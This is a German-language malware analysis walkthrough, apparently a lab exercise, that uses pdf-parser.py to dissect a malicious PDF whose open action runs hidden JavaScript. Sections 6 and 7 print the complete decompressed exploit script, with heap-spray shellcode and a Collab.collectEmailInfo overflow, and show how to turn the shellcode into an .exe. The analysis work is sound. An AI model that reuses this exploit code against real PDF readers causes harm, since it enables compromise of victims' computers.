## 1. Dateityp-Identifikation

Wir haben den Befehl `file SurveyOnObama.bin` im Terminal unter Ubuntu Subsystem ausgeführt. Die Ausgabe war:

```bash
SurveyOnObama.bin: PDF document, version 1.5
```

Das bedeutet, dass unsere Datei vom Typ **PDF** ist.


## 2. Verwendung von pdf-parser.py

Für die Analyse benötigen wir das Tool `pdf-parser.py`, das wir von GitHub herunterladen:

🔗 https://github.com/DidierStevens/DidierStevensSuite/blob/master/pdf-parser.py

Nachdem das Tool heruntergeladen wurde, führen wir den folgenden Befehl im Terminal aus:

```bash
python3 pdf-parser.py -f -a SurveyOnObama.bin
```

### Erklärung der Optionen:

- `-f`, `--filter`: wendet automatische Dekompression an (FlateDecode, ASCIIHexDecode, ASCII85Decode, LZWDecode und RunLengthDecode)
- `-a`, `--stats`: zeigt statistische Informationen über die PDF-Dokumentstruktur an

Die Ausgabe war:
```bash
This program has not been tested with this version of Python (3.13.3)
Should you encounter problems, please use Python version 3.12.2
Comment: 146
XREF: 8
Trailer: 8
StartXref: 4
Indirect object: 52
Indirect objects with a stream: 25, 26, 27, 19, 24, 33, 31, 32, 25, 26, 27, 19, 24, 33, 31, 32
  24: 2, 3, 6, 9, 11, 14, 19, 6, 28, 29, 30, 31, 2, 3, 6, 9, 11, 14, 19, 6, 28, 29, 30, 31
 /Catalog 4: 16, 16, 16, 16
 /ExtGState 2: 22, 22
 /Font 2: 20, 20
 /FontDescriptor 2: 21, 21
 /Metadata 4: 24, 32, 24, 32
 /ObjStm 4: 25, 26, 25, 26
 /Page 4: 18, 18, 18, 18
 /Pages 2: 4, 4
 /XRef 4: 27, 33, 27, 33
Unreferenced indirect objects: 9 0 R, 11 0 R, 25 0 R, 26 0 R, 27 0 R, 28 0 R, 33 0 R
Unreferenced indirect objects without /ObjStm objects: 9 0 R, 11 0 R, 27 0 R, 28 0 R, 33 0 R
Search keywords:
 /JS 2: 29, 29
 /JavaScript 2: 29, 29
 /AA 2: 18, 18
```

=> Das Ergebnis zeigte, dass die Datei JavaScript enthält und Aktionen automatisch ausführen kann


## 3. Analyse von Objekt 29 (JavaScript-Verweis)

Dann haben wir uns Objekt 29 genauer angeschaut, da es sich um einen möglichen JavaScript-Verweis handelt. Dazu führten wir folgenden Befehl aus:

```bash
python3 pdf-parser.py -o 29 SurveyOnObama.bin
```

### Erklärung der Option:

- `-o`, `--objstm`: analysiert den Inhalt eines bestimmten Objekt-Streams (z. B. JavaScript, eingebettete Streams)

Die Ausgabe war:
```bash
This program has not been tested with this version of Python (3.13.3)
Should you encounter problems, please use Python version 3.12.2
obj 29 0
 Type:
 Referencing: 31 0 R

  <<
    /S /JavaScript
    /JS 31 0 R
  >>


obj 29 0
 Type:
 Referencing: 31 0 R

  <<
    /S /JavaScript
    /JS 31 0 R
  >>
```

=> Man sieht, dass es auf Objekt 31 verweist


## 4. Analyse von Objekt 18 (Seite mit automatischer Aktion)

Danach haben wir Objekt 18 untersucht, da es sich um die Seite handelt, auf der eine automatische Aktion definiert ist. Der verwendete Befehl lautet:

```bash
python3 pdf-parser.py -o 18 SurveyOnObama.bin
```

Die Ausgabe war:
```bash
This program has not been tested with this version of Python (3.13.3)
Should you encounter problems, please use Python version 3.12.2
obj 18 0
 Type: /Page
 Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R

  <<
    /Contents 19 0 R
    /Type /Page
    /Parent 4 0 R
    /Rotate 0
    /MediaBox [0 0 595 842]
    /CropBox [0 0 595 842]
    /Resources
      <<
        /Font
          <<
            /TT0 20 0 R
          >>
        /ProcSet [/PDF/Text]
        /ExtGState
          <<
            /GS0 22 0 R
          >>
      >>
    /StructParents 0
  >>


obj 18 0
 Type: /Page
 Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R, 29 0 R

  <<
    /Contents 19 0 R
    /Type /Page
    /Parent 4 0 R
    /Rotate 0
    /MediaBox [0 0 595 842]
    /CropBox [0 0 595 842]
    /Resources
      <<
        /Font
          <<
            /TT0 20 0 R
          >>
        /ProcSet [/PDF/Text]
        /ExtGState
          <<
            /GS0 22 0 R
          >>
      >>
    /AA
      <<
        /O 29 0 R
      >>
    /StructParents 0
  >>


obj 18 0
 Type: /Page
 Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R

  <<
    /Contents 19 0 R
    /Type /Page
    /Parent 4 0 R
    /Rotate 0
    /MediaBox [0 0 595 842]
    /CropBox [0 0 595 842]
    /Resources
      <<
        /Font
          <<
            /TT0 20 0 R
          >>
        /ProcSet [/PDF/Text]
        /ExtGState
          <<
            /GS0 22 0 R
          >>
      >>
    /StructParents 0
  >>


obj 18 0
 Type: /Page
 Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R, 29 0 R

  <<
    /Contents 19 0 R
    /Type /Page
    /Parent 4 0 R
    /Rotate 0
    /MediaBox [0 0 595 842]
    /CropBox [0 0 595 842]
    /Resources
      <<
        /Font
          <<
            /TT0 20 0 R
          >>
        /ProcSet [/PDF/Text]
        /ExtGState
          <<
            /GS0 22 0 R
          >>
      >>
    /AA
      <<
        /O 29 0 R
      >>
    /StructParents 0
  >>
```

=> Man sieht die `/AA /O`-Aktion, die Objekt 29 aufruft.


## 5. Analyse von Objekt 31 (JavaScript-Inhalt)

Anschließend haben wir die Struktur von Objekt 31 geprüft mit folgendem Befehl:

```bash
python3 pdf-parser.py -o 31 SurveyOnObama.bin
```

Die Ausgabe war:
```bash
This program has not been tested with this version of Python (3.13.3)
Should you encounter problems, please use Python version 3.12.2
obj 31 0
 Type:
 Referencing: 30 0 R
 Contains stream

  <<
    /Length 30 0 R
    /Filter [/FlateDecode]
  >>


obj 31 0
 Type:
 Referencing: 30 0 R
 Contains stream

  <<
    /Length 30 0 R
    /Filter [/FlateDecode]
  >>
```

=> Man sieht, dass es einen komprimierten Stream enthält (`/Filter [/FlateDecode]`).


## 6. Extraktion und Dekompression des JavaScript-Codes

Zuletzt haben wir den eigentlichen JavaScript-Code aus Objekt 31 sichtbar gemacht und dekomprimiert mit folgendem Befehl:

```bash
python3 pdf-parser.py -o 31 -f SurveyOnObama.bin
```

Die Ausgabe war:
```bash
This program has not been tested with this version of Python (3.13.3)
Should you encounter problems, please use Python version 3.12.2
obj 31 0
 Type:
 Referencing: 30 0 R
 Contains stream

  <<
    /Length 30 0 R
    /Filter [/FlateDecode]
  >>

 b'function re(count,what) \r\n{\r\nvar v = "";\r\nwhile (--count >= 0) \r\nv += what;\r\nreturn v;\r\n} \r\nfunction sopen() \r\n{\r\nsc = unescape("%uc933%ub966%u017c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f62%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6259%u6d64%u6f61%u6667%u7067%u6767%u6b61%u6668%u6760%u6459%u625d%u6561%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5e%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f");\r\nif (app.viewerVersion >= 7.0)\r\n{\r\nplin = re(1124,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%uFCFC%uFCFC") + re(120,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%uFCFC%uFCFC") + sc + re(1256,unescape("%u6161%u6161"));\r\n} \r\nelse \r\n{\r\nef6 =  unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");\r\nplin = re(80,unescape("%uFCFC%uFCFC")) + sc + re(80,unescape("%uFCFC%uFCFC"))+ unescape("%u17e9%ufffb")+unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");\r\nwhile ((plin.length % 8) != 0) \r\nplin = unescape("%u6161") + plin;\r\nplin += re(2626,ef6);\r\n}\r\nif (app.viewerVersion >= 6.0)\r\n{\r\nthis.collabStore = Collab.collectEmailInfo({subj: "",msg: plin});\r\n}\r\n}\r\nvar shaft = app.setTimeOut("sopen()",1200);'

obj 31 0
 Type:
 Referencing: 30 0 R
 Contains stream

  <<
    /Length 30 0 R
    /Filter [/FlateDecode]
  >>

 b'function re(count,what) \r\n{\r\nvar v = "";\r\nwhile (--count >= 0) \r\nv += what;\r\nreturn v;\r\n} \r\nfunction sopen() \r\n{\r\nsc = unescape("%uc933%ub966%u017c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f62%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6259%u6d64%u6f61%u6667%u7067%u6767%u6b61%u6668%u6760%u6459%u625d%u6561%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5e%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f");\r\nif (app.viewerVersion >= 7.0)\r\n{\r\nplin = re(1124,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%uFCFC%uFCFC") + re(120,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%uFCFC%uFCFC") + sc + re(1256,unescape("%u6161%u6161"));\r\n} \r\nelse \r\n{\r\nef6 =  unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");\r\nplin = re(80,unescape("%uFCFC%uFCFC")) + sc + re(80,unescape("%uFCFC%uFCFC"))+ unescape("%u17e9%ufffb")+unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");\r\nwhile ((plin.length % 8) != 0) \r\nplin = unescape("%u6161") + plin;\r\nplin += re(2626,ef6);\r\n}\r\nif (app.viewerVersion >= 6.0)\r\n{\r\nthis.collabStore = Collab.collectEmailInfo({subj: "",msg: plin});\r\n}\r\n}\r\nvar shaft = app.setTimeOut("sopen()",1200);'


```

=> Der JavaScript-Code verwendet `unescape()` und eine Funktion `re()` zum Dekodieren von Shellcode, der in Unicode-Zeichen versteckt ist. Am Ende wird der Code mit `app.setTimeOut("sopen", 1200)` ausgeführt.

## 7. Extraktion des Shellcodes aus JavaScript

Um den Shellcode zu extrahieren, schreiben wir ein Python-Skript, das die `%uXXXX`-Werte in rohe Bytes umwandelt. Das Ergebnis wird in einer Datei `shellcode_extracted.bin` gespeichert.

### Dateiname: `extract_shellcode.py`

```python
import re

# Raw JavaScript shellcode in %uXXXX format
data = '''%uc933%ub966%u017c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f62%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6259%u6d64%u6f61%u6667%u7067%u6767%u6b61%u6668%u6760%u6459%u625d%u6561%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5e%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f'''

shellcode = b""

# Extract %uXXXX pairs using regex
matches = re.findall(r"%u([0-9a-fA-F]{4})", data)

for match in matches:
    # Convert to bytes in little-endian format
    bytes_le = bytes.fromhex(match)
    shellcode += bytes([bytes_le[1], bytes_le[0]])

# Write the decoded shellcode to a binary file
with open("shellcode.bin", "wb") as f:
    f.write(shellcode)
```

Nach dem Ausführen dieses Skripts mit:

```bash
python extract_shellcode.py
```

=> haben wir die Datei `shellcode.bin` erhalten.


## 8. Umwandlung des Shellcodes in eine ausführbare Datei

Um eine dynamische Analyse mit `x32dbg` durchzuführen, müssen wir den Shellcode in eine `.exe`-Datei umwandeln. Dafür verwenden wir das Tool `shcode2exe`, das wir von GitHub herunterladen:

🔗 https://github.com/accidentalrebel/shcode2exe/blob/master/shcode2exe.py

Nachdem wir das Skript heruntergeladen haben, führen wir den folgenden Befehl aus:

```bash
python shcode2exe.py -o full_sc.exe shellcode.bin
```

=> Dies erzeugt eine Datei namens `full_sc.exe`, die wir nun mit Debugging-Tools wie `x32dbg` weiter untersuchen können.
